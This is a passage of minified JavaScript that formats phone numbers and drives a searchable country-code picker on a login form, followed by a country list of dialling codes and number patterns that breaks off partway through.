function inputFormatPhoneInit(e,t,X){var n,s=window.CountriesList||[],a=[],o=[],d={},r={};for(E=0;E<s.length;E++)for((f=s[E]).lname||(f.lname=f.name),f.country_codes=[],n=0;n<f.codes.length;n++){var i=f.codes[n],c=i.code;if(i.patterns)for(L=0;L<i.patterns.length;L++){for(var p=i.patterns[L],l="",m=c,u="",g=0;g<p.length;g++)"0"<=p[g]&&p[g]<="9"?(l+=p[g],m+=p[g],u+="X"):u+=p[g];r[m]||(o.push([c,l,c+l,u]),r[m]=!0)}if(i.prefixes)for(L=0;L<i.prefixes.length;L++)d[m=c+(l=i.prefixes[L])]||(a.push([c,l,c+l,f]),d[m]=!0);else d[c]||(a.push([c,"",c,f]),d[c]=!0);f.country_codes.push(c)}try{var h=new Intl.Collator(X||"en",{sensitivity:"base"}).compare}catch(e){h=function(e,t){return(e=e.toLowerCase())<(t=t.toLowerCase())?-1:t<e?1:0}}function v(e,t){return e[2]<t[2]?1:e[2]>t[2]?-1:0}for(var y=[],E=0;E<s.length;E++)if(!s[E].hidden)for(var f=s[E],L=0;L<f.country_codes.length;L++){c=f.country_codes[L];y.push({country_code:c,iso2:f.iso2,lname:f.lname,name:f.name,query_str:[f.iso2,f.name,f.lname,c].join("\n")})}o.sort(v),a.sort(v),y.sort(function(e,t){return h(e.lname,t.lname)});var B={BACKSPACE:8,TAB:9,RETURN:13,ESC:27,LEFT:37,RIGHT:39,UP:38,DOWN:40},I=document.getElementById("login-phone-code"),S=document.getElementById("login-phone"),T=(document.getElementById("login-code"),document.getElementById("login-phone-placeholder")),w=document.getElementById("login-country-wrap"),C=document.getElementById("login-country-selected"),M=document.getElementById("login-country-search"),b=document.getElementById("login-country-search-results");var R,N,A={};function P(e){var t=null;if(t=A[e])return{prefix:e,iso2:t.iso2,lname:t.lname};for(var X=0;X<a.length;X++){var n=a[X][0],s=a[X][2],t=a[X][3];if(0===e.indexOf(s))return{prefix:n,iso2:t.iso2,lname:t.lname}}return!1}function H(e){for(var t=0;t<o.length;t++){var X=o[t][3],n=o[t][2];if(0===e.indexOf(n))return X}return!1}function D(e){for(var t=0;t<s.length;t++){var X=s[t];if(e==X.iso2)return X}return!1}function K(e){for(var t=0;t<a.length;t++)if(0===a[t][0].indexOf(e))return 1}function U(e){e.target!==S||e.keyCode!=B.LEFT&&e.keyCode!=B.BACKSPACE||S.selectionStart!=S.selectionEnd||0!=S.selectionStart?e.target===I&&e.keyCode==B.RIGHT&&I.selectionStart==I.selectionEnd&&I.selectionStart==I.value.length?(S.focus(),S.setSelectionRange(0,0)):e.target!==S||e.keyCode!=B.LEFT&&e.keyCode!=B.BACKSPACE||S.selectionStart!=S.selectionEnd||" "!=S.value.substr(S.selectionStart-1,1)?e.target===S&&e.keyCode==B.RIGHT&&S.selectionStart==S.selectionEnd&&" "==S.value.substr(S.selectionStart,1)&&S.setSelectionRange(S.selectionStart+1,S.selectionStart+1):S.setSelectionRange(S.selectionStart-1,S.selectionStart-1):(I.focus(),I.setSelectionRange(I.value.length,I.value.length))}function G(e){if(e&&(e.keyCode<48||57<e.keyCode))return!1;var t,e=(I.value+S.value).substr(0,24),X=(X=document.activeElement===I?I.selectionStart:I.value.length+S.selectionStart,e.substr(0,X)),e=e.replace(/[^0-9]/g,""),n=(X=X.replace(/[^0-9]/g,"")).length,s=P(e),a=1+n,o=!1,d=0;if(s){var o=!0,X=s.prefix,r=H(e)||"",i=e.substr(X.length),c="+"+X,p=u="";d+=X.length;for(var l=0,m=0;l<r.length;l++)"X"==r[l]?(u+=i[m]||"",p+=i[m]||"&minus;",m++,d++):(u+=m<i.length?r[l]:"",p+=r[l],d<n&&a++);m<i.length&&(u+=i.substr(m)),C.innerHTML=s.lname,C.classList.add("is-dirty"),M.value=N=s.lname}else{var c="+",u="",p=(K(e)?c+=e:(o=!0,u+=e),u);C.innerHTML=C.getAttribute("data-placeholder"),C.classList.remove("is-dirty"),M.value=N=""}p.length||u.length||(p=T.getAttribute("data-placeholder")||""),T.innerHTML=p,I.value=c,S.value=u,(t=a>c.length||o&&a==c.length?(a-=c.length,S):I).focus(),t.setSelectionRange(a,a),setTimeout(function(){t.setSelectionRange(a,a)},0),I.parentNode.classList.remove("is-invalid"),S.parentNode.classList.remove("is-invalid"),k(!0)}function F(e){e.keyCode==B.ESC?(e.preventDefault(),k()):e.keyCode==B.UP?(e.preventDefault(),R&&R.previousSibling&&x(R.previousSibling,!0)):e.keyCode==B.DOWN?(e.preventDefault(),R&&R.nextSibling&&x(R.nextSibling,!0)):e.keyCode==B.TAB?(e.preventDefault(),k()):e.keyCode==B.RETURN&&(e.preventDefault(),V(R))}function _(e){k()}function q(e){N!=M.value&&(N=M.value,O(M.value))}function O(e){e=e||"";for(var t,X="(^|[\\s,.:;\"'\\-])",n=new RegExp(X+cleanRE(e||""),"i"),s="",a=!1,o=0;o<y.length;o++){var d=y[o];(!e||n.test(d.query_str)||"+"==e[0]&&new RegExp(X+cleanRE(e.substr(1)),"i").test(d.country_code))&&(a=!0,s+='<div class="login_country_search_result" data-code="'+d.iso2+'" data-prefix="'+d.country_code+'"><span dir="auto">'+d.lname+'</span><span dir="auto" class="prefix">+'+d.country_code+"</span></div>")}a||(t=b.getAttribute("data-noresult"),s='<div class="login_country_search_noresult">'+(t||"").replace(/&/g,"&amp;").replace(/>/g,"&gt;").replace(/</g,"&lt;").replace(/"/g,"&quot;").replace(/'/g,"&apos;")+"</div>"),b.innerHTML=s,x(a?b.children[0]:null,!0)}function x(e,t){var X,n;R&&R.classList.remove("selected"),e?((R=e).classList.add("selected"),t&&(t=e,e=b.scrollTop,X=t.offsetTop,t=X+t.offsetHeight,n=b.offsetHeight,X<e?b.scrollTop=X:e+n<t&&(b.scrollTop=t-n))):R=null}function V(e){var t,X,n;e&&(t=e.getAttribute("data-code"),e=e.getAttribute("data-prefix"),(X=D(t))&&(n=S.value,A[e]=X,P(e+n.replace(/[^0-9]/g,"")).iso2!=t&&(S.value=""),I.value=e)),k()}function k(e){w.classList.remove("opened"),document.removeEventListener("keydown",F),document.removeEventListener("click",_),S.setSelectionRange(S.value.length,S.value.length),e||G()}I.addEventListener("input",G),I.addEventListener("keydown",U),S.addEventListener("input",G),S.addEventListener("keydown",U),C.addEventListener("click",function(e){e.stopPropagation(),w.classList.add("opened"),M.value=N="",setTimeout(function(){M.focus(),M.setSelectionRange(0,M.value.length)},50),O(M.value),document.addEventListener("keydown",F),document.addEventListener("click",_)}),M.addEventListener("click",function(e){e.stopPropagation()}),M.addEventListener("input",q),M.addEventListener("keydown",function(e){setTimeout(q,0,e)}),b.addEventListener("mouseover",function(e){for(var t=e.target;t&&t.classList;){if(t.classList.contains("login_country_search_result"))return void x(t);t=t.parentNode}}),b.addEventListener("click",function(e){e.stopPropagation();for(var t=e.target;t&&t.classList;){if(t.classList.contains("login_country_search_result"))return void V(t);t=t.parentNode}});X="+";t?X+=t:e&&(t=D(e))&&1==t.codes.length&&(X+=t.codes[0].code),I.value=X,S.focus(),G()}var CountriesList=[{iso2:"AD",name:"Andorra",codes:[{code:"376",patterns:["XX XX XX"]}],patterns:[]},{iso2:"AE",name:"United Arab Emirates",codes:[{code:"971",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"AF",name:"Afghanistan",codes:[{code:"93",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"AG",name:"Antigua &amp; Barbuda",codes:[{code:"1268",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"AI",name:"Anguilla",codes:[{code:"1264",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"AL",name:"Albania",codes:[{code:"355",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"AM",name:"Armenia",codes:[{code:"374",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"AO",name:"Angola",codes:[{code:"244",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"AR",name:"Argentina",codes:[{code:"54"}]},{iso2:"AS",name:"American Samoa",codes:[{code:"1684",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"AT",name:"Austria",codes:[{code:"43",patterns:["X XXXXXXXX"]}],patterns:[]},{iso2:"AU",name:"Australia",codes:[{code:"61",patterns:["X XXXX XXXX"]}],patterns:[]},{iso2:"AW",name:"Aruba",codes:[{code:"297",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"AZ",name:"Azerbaijan",codes:[{code:"994",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"BA",name:"Bosnia &amp; Herzegovina",codes:[{code:"387",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"BB",name:"Barbados",codes:[{code:"1246",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"BD",name:"Bangladesh",codes:[{code:"880",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"BE",name:"Belgium",codes:[{code:"32",patterns:["XXX XX XX XX"]}],patterns:[]},{iso2:"BF",name:"Burkina Faso",codes:[{code:"226",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"BG",name:"Bulgaria",codes:[{code:"359"}]},{iso2:"BH",name:"Bahrain",codes:[{code:"973",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"BI",name:"Burundi",codes:[{code:"257",patterns:["XX XX XXXX"]}],patterns:[]},{iso2:"BJ",name:"Benin",codes:[{code:"229",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"BM",name:"Bermuda",codes:[{code:"1441",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"BN",name:"Brunei Darussalam",codes:[{code:"673",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"BO",name:"Bolivia",codes:[{code:"591",patterns:["X XXX XXXX"]}],patterns:[]},{iso2:"BQ",name:"Bonaire, Sint Eustatius &amp; Saba",codes:[{code:"599"}]},{iso2:"BR",name:"Brazil",codes:[{code:"55",patterns:["XX XXXXX XXXX"]}],patterns:[]},{iso2:"BS",name:"Bahamas",codes:[{code:"1242",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"BT",name:"Bhutan",codes:[{code:"975",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"BW",name:"Botswana",codes:[{code:"267",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"BY",name:"Belarus",codes:[{code:"375",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"BZ",name:"Belize",codes:[{code:"501"}]},{iso2:"CA",name:"Canada",codes:[{code:"1",prefixes:["403","587","780","825","236","250","604","672","778","204","431","506","709","902","782","226","249","289","343","365","416","437","519","548","613","647","705","807","905","418","438","450","514","579","581","819","873","306","639","867"],patterns:["XXX XXX XXXX"]}],prefixes:[],patterns:[]},{iso2:"CD",name:"Congo (Dem. Rep.)",codes:[{code:"243",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"CF",name:"Central African Rep.",codes:[{code:"236",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"CG",name:"Congo (Rep.)",codes:[{code:"242",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"CH",name:"Switzerland",codes:[{code:"41",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"CI",name:"Côte d&#39;Ivoire",codes:[{code:"225",patterns:["XX XX XX XXXX"]}],patterns:[]},{iso2:"CK",name:"Cook Islands",codes:[{code:"682"}]},{iso2:"CL",name:"Chile",codes:[{code:"56",patterns:["X XXXX XXXX"]}],patterns:[]},{iso2:"CM",name:"Cameroon",codes:[{code:"237",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"CN",name:"China",codes:[{code:"86",patterns:["XXX XXXX XXXX"]}],patterns:[]},{iso2:"CO",name:"Colombia",codes:[{code:"57",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"CR",name:"Costa Rica",codes:[{code:"506",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"CU",name:"Cuba",codes:[{code:"53",patterns:["X XXX XXXX"]}],patterns:[]},{iso2:"CV",name:"Cape Verde",codes:[{code:"238",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"CW",name:"Curaçao",codes:[{code:"599",prefixes:["9"]}],prefixes:[]},{iso2:"CY",name:"Cyprus",codes:[{code:"357",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"CZ",name:"Czech Republic",codes:[{code:"420",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"DE",name:"Germany",codes:[{code:"49",patterns:["XX XXX XXXXX","15 XXX XXX XXX","17 6XX XXX XX","3601 4198XX"]}],patterns:[]},{iso2:"DJ",name:"Djibouti",codes:[{code:"253",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"DK",name:"Denmark",codes:[{code:"45",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"DM",name:"Dominica",codes:[{code:"1767",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"DO",name:"Dominican Rep.",codes:[{code:"1809",patterns:["XXX XXXX"]},{code:"1829",patterns:["XXX XXXX"]},{code:"1849",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"DZ",name:"Algeria",codes:[{code:"213",patterns:["XXX XX XX XX"]}],patterns:[]},{iso2:"EC",name:"Ecuador",codes:[{code:"593",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"EE",name:"Estonia",codes:[{code:"372",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"EG",name:"Egypt",codes:[{code:"20",patterns:["XX XXXX XXXX"]}],patterns:[]},{iso2:"ER",name:"Eritrea",codes:[{code:"291",patterns:["X XXX XXX"]}],patterns:[]},{iso2:"ES",name:"Spain",codes:[{code:"34",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"ET",name:"Ethiopia",codes:[{code:"251",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"FI",name:"Finland",codes:[{code:"358"}]},{iso2:"FJ",name:"Fiji",codes:[{code:"679",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"FK",name:"Falkland Islands",codes:[{code:"500"}]},{iso2:"FM",name:"Micronesia",codes:[{code:"691"}]},{iso2:"FO",name:"Faroe Islands",codes:[{code:"298",patterns:["XXX XXX"]}],patterns:[]},{iso2:"FR",name:"France",codes:[{code:"33",patterns:["X XX XX XX XX"]}],patterns:[]},{iso2:"GA",name:"Gabon",codes:[{code:"241",patterns:["X XX XX XX"]}],patterns:[]},{iso2:"GB",name:"United Kingdom",codes:[{code:"44",patterns:["XXXX XXXXXX"]}],patterns:[]},{iso2:"GD",name:"Grenada",codes:[{code:"1473",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"GE",name:"Georgia",codes:[{code:"995",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"GF",name:"French Guiana",codes:[{code:"594"}]},{iso2:"GH",name:"Ghana",codes:[{code:"233",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"GI",name:"Gibraltar",codes:[{code:"350",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"GL",name:"Greenland",codes:[{code:"299",patterns:["XXX XXX"]}],patterns:[]},{iso2:"GM",name:"Gambia",codes:[{code:"220",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"GN",name:"Guinea",codes:[{code:"224",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"GP",name:"Guadeloupe",codes:[{code:"590",patterns:["XXX XX XX XX"]}],patterns:[]},{iso2:"GQ",name:"Equatorial Guinea",codes:[{code:"240",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"GR",name:"Greece",codes:[{code:"30",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"GT",name:"Guatemala",codes:[{code:"502",patterns:["X XXX XXXX"]}],patterns:[]},{iso2:"GU",name:"Guam",codes:[{code:"1671",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"GW",name:"Guinea-Bissau",codes:[{code:"245",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"GY",name:"Guyana",codes:[{code:"592"}]},{iso2:"HK",name:"Hong Kong",codes:[{code:"852",patterns:["X XXX XXXX"]}],patterns:[]},{iso2:"HN",name:"Honduras",codes:[{code:"504",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"HR",name:"Croatia",codes:[{code:"385",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"HT",name:"Haiti",codes:[{code:"509",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"HU",name:"Hungary",codes:[{code:"36",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"ID",name:"Indonesia",codes:[{code:"62",patterns:["XXX XXXXXX"]}],patterns:[]},{iso2:"IE",name:"Ireland",codes:[{code:"353",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"IL",name:"Israel",codes:[{code:"972",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"IN",name:"India",codes:[{code:"91",patterns:["XXXXX XXXXX"]}],patterns:[]},{iso2:"IO",name:"Diego Garcia",codes:[{code:"246",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"IQ",name:"Iraq",codes:[{code:"964",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"IR",name:"Iran",codes:[{code:"98",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"IS",name:"Iceland",codes:[{code:"354",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"IT",name:"Italy",codes:[{code:"39",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"JM",name:"Jamaica",codes:[{code:"1876",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"JO",name:"Jordan",codes:[{code:"962",patterns:["X XXXX XXXX"]}],patterns:[]},{iso2:"JP",name:"Japan",codes:[{code:"81",patterns:["XX XXXX XXXX"]}],patterns:[]},{iso2:"KE",name:"Kenya",codes:[{code:"254",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"KG",name:"Kyrgyzstan",codes:[{code:"996",patterns:["XXX XXXXXX"]}],patterns:[]},{iso2:"KH",name:"Cambodia",codes:[{code:"855",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"KI",name:"Kiribati",codes:[{code:"686",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"KM",name:"Comoros",codes:[{code:"269",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"KN",name:"Saint Kitts &amp; Nevis",codes:[{code:"1869",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"KP",name:"North Korea",codes:[{code:"850"}]},{iso2:"KR",name:"South Korea",codes:[{code:"82",patterns:["XX XXXX XXX"]}],patterns:[]},{iso2:"KW",name:"Kuwait",codes:[{code:"965",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"KY",name:"Cayman Islands",codes:[{code:"1345",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"KZ",name:"Kazakhstan",codes:[{code:"7",prefixes:["6","7"],patterns:["XXX XXX XX XX"]}],prefixes:[],patterns:[]},{iso2:"LA",name:"Laos",codes:[{code:"856",patterns:["XX XX XXX XXX"]}],patterns:[]},{iso2:"LB",name:"Lebanon",codes:[{code:"961",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"LC",name:"Saint Lucia",codes:[{code:"1758",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"LI",name:"Liechtenstein",codes:[{code:"423",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"LK",name:"Sri Lanka",codes:[{code:"94",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"LR",name:"Liberia",codes:[{code:"231",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"LS",name:"Lesotho",codes:[{code:"266",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"LT",name:"Lithuania",codes:[{code:"370",patterns:["XXX XXXXX"]}],patterns:[]},{iso2:"LU",name:"Luxembourg",codes:[{code:"352",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"LV",name:"Latvia",codes:[{code:"371",patterns:["XXX XXXXX"]}],patterns:[]},{iso2:"LY",name:"Libya",codes:[{code:"218",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"MA",name:"Morocco",codes:[{code:"212",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"MC",name:"Monaco",codes:[{code:"377",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"MD",name:"Moldova",codes:[{code:"373",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"ME",name:"Montenegro",codes:[{code:"382"}]},{iso2:"MG",name:"Madagascar",codes:[{code:"261",patterns:["XX XX XXX XX"]}],patterns:[]},{iso2:"MH",name:"Marshall Islands",codes:[{code:"692"}]},{iso2:"MK",name:"North Macedonia",codes:[{code:"389",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"ML",name:"Mali",codes:[{code:"223",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"MM",name:"Myanmar",codes:[{code:"95"}]},{iso2:"MN",name:"Mongolia",codes:[{code:"976",patterns:["XX XX XXXX"]}],patterns:[]},{iso2:"MO",name:"Macau",codes:[{code:"853",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"MP",name:"Northern Mariana Islands",codes:[{code:"1670",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"MQ",name:"Martinique",codes:[{code:"596"}]},{iso2:"MR",name:"Mauritania",codes:[{code:"222",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"MS",name:"Montserrat",codes:[{code:"1664",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"MT",name:"Malta",codes:[{code:"356",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"MU",name:"Mauritius",codes:[{code:"230",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"MV",name:"Maldives",codes:[{code:"960",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"MW",name:"Malawi",codes:[{code:"265",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"MX",name:"Mexico",codes:[{code:"52"}]},{iso2:"MY",name:"Malaysia",codes:[{code:"60",patterns:["XX XXXX XXXX"]}],patterns:[]},{iso2:"MZ",name:"Mozambique",codes:[{code:"258",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"NA",name:"Namibia",codes:[{code:"264",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"NC",name:"New Caledonia",codes:[{code:"687"}]},{iso2:"NE",name:"Niger",codes:[{code:"227",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"NF",name:"Norfolk Island",codes:[{code:"672"}]},{iso2:"NG",name:"Nigeria",codes:[{code:"234",patterns:["XX XXXX XXXX"]}],patterns:[]},{iso2:"NI",name:"Nicaragua",codes:[{code:"505",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"NL",name:"Netherlands",codes:[{code:"31",patterns:["X XX XX XX XX","97 XXXX XXXXX"]}],patterns:[]},{iso2:"NO",name:"Norway",codes:[{code:"47",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"NP",name:"Nepal",codes:[{code:"977",patterns:["XX XXXX XXXX"]}],patterns:[]},{iso2:"NR",name:"Nauru",codes:[{code:"674"}]},{iso2:"NU",name:"Niue",codes:[{code:"683"}]},{iso2:"NZ",name:"New Zealand",codes:[{code:"64",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"OM",name:"Oman",codes:[{code:"968",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"PA",name:"Panama",codes:[{code:"507",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"PE",name:"Peru",codes:[{code:"51",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"PF",name:"French Polynesia",codes:[{code:"689"}]},{iso2:"PG",name:"Papua New Guinea",codes:[{code:"675"}]},{iso2:"PH",name:"Philippines",codes:[{code:"63",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"PK",name:"Pakistan",codes:[{code:"92",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"PL",name:"Poland",codes:[{code:"48",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"PM",name:"Saint Pierre &amp; Miquelon",codes:[{code:"508"}]},{iso2:"PR",name:"Puerto Rico",codes:[{code:"1787",patterns:["XXX XXXX"]},{code:"1939",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"PS",name:"Palestine",codes:[{code:"970",patterns:["XXX XX XXXX"]}],patterns:[]},{iso2:"PT",name:"Portugal",codes:[{code:"351",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"PW",name:"Palau",codes:[{code:"680"}]},{iso2:"PY",name:"Paraguay",codes:[{code:"595",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"QA",name:"Qatar",codes:[{code:"974",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"RE",name:"Réunion",codes:[{code:"262",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"RO",name:"Romania",codes:[{code:"40",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"RS",name:"Serbia",codes:[{code:"381",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"RU",name:"Russian Federation",codes:[{code:"7",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"RW",name:"Rwanda",codes:[{code:"250",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"SA",name:"Saudi Arabia",codes:[{code:"966",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"SB",name:"Solomon Islands",codes:[{code:"677"}]},{iso2:"SC",name:"Seychelles",codes:[{code:"248",patterns:["X XX XX XX"]}],patterns:[]},{iso2:"SD",name:"Sudan",codes:[{code:"249",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"SE",name:"Sweden",codes:[{code:"46",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"SG",name:"Singapore",codes:[{code:"65",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"SH",name:"Saint Helena",codes:[{code:"247"},{code:"290",patterns:["XX XXX"]}],patterns:[]},{iso2:"SI",name:"Slovenia",codes:[{code:"386",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"SK",name:"Slovakia",codes:[{code:"421",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"SL",name:"Sierra Leone",codes:[{code:"232",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"SM",name:"San Marino",codes:[{code:"378",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"SN",name:"Senegal",codes:[{code:"221",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"SO",name:"Somalia",codes:[{code:"252",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"SR",name:"Suriname",codes:[{code:"597",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"SS",name:"South Sudan",codes:[{code:"211",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"ST",name:"São Tomé &amp; Príncipe",codes:[{code:"239",patterns:["XX XXXXX"]}],patterns:[]},{iso2:"SV",name:"El Salvador",codes:[{code:"503",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"SX",name:"Sint Maarten",codes:[{code:"1721",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"SY",name:"Syria",codes:[{code:"963",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"SZ",name:"Eswatini",codes:[{code:"268",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"TC",name:"Turks &amp; Caicos Islands",codes:[{code:"1649",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"TD",name:"Chad",codes:[{code:"235",patterns:["XX XX XX XX"]}],patterns:[]},{iso2:"TG",name:"Togo",codes:[{code:"228",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"TH",name:"Thailand",codes:[{code:"66",patterns:["X XXXX XXXX"]}],patterns:[]},{iso2:"TJ",name:"Tajikistan",codes:[{code:"992",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"TK",name:"Tokelau",codes:[{code:"690"}]},{iso2:"TL",name:"Timor-Leste",codes:[{code:"670"}]},{iso2:"TM",name:"Turkmenistan",codes:[{code:"993",patterns:["XX XXXXXX"]}],patterns:[]},{iso2:"TN",name:"Tunisia",codes:[{code:"216",patterns:["XX XXX XXX"]}],patterns:[]},{iso2:"TO",name:"Tonga",codes:[{code:"676"}]},{iso2:"TR",name:"Turkey",codes:[{code:"90",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"TT",name:"Trinidad &amp; Tobago",codes:[{code:"1868",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"TV",name:"Tuvalu",codes:[{code:"688"}]},{iso2:"TW",name:"Taiwan",codes:[{code:"886",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"TZ",name:"Tanzania",codes:[{code:"255",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"UA",name:"Ukraine",codes:[{code:"380",patterns:["XX XXX XX XX"]}],patterns:[]},{iso2:"UG",name:"Uganda",codes:[{code:"256",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"US",name:"USA",codes:[{code:"1",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"UY",name:"Uruguay",codes:[{code:"598",patterns:["X XXX XXXX"]}],patterns:[]},{iso2:"UZ",name:"Uzbekistan",codes:[{code:"998",patterns:["XX XXX XX XX"]}],patterns:[]},{iso2:"VC",name:"Saint Vincent &amp; the Grenadines",codes:[{code:"1784",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"VE",name:"Venezuela",codes:[{code:"58",patterns:["XXX XXX XXXX"]}],patterns:[]},{iso2:"VG",name:"British Virgin Islands",codes:[{code:"1284",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"VI",name:"US Virgin Islands",codes:[{code:"1340",patterns:["XXX XXXX"]}],patterns:[]},{iso2:"VN",name:"Vietnam",codes:[{code:"84"}]},{iso2:"VU",name:"Vanuatu",codes:[{code:"678"}]},{iso2:"WF",name:"Wallis &amp; 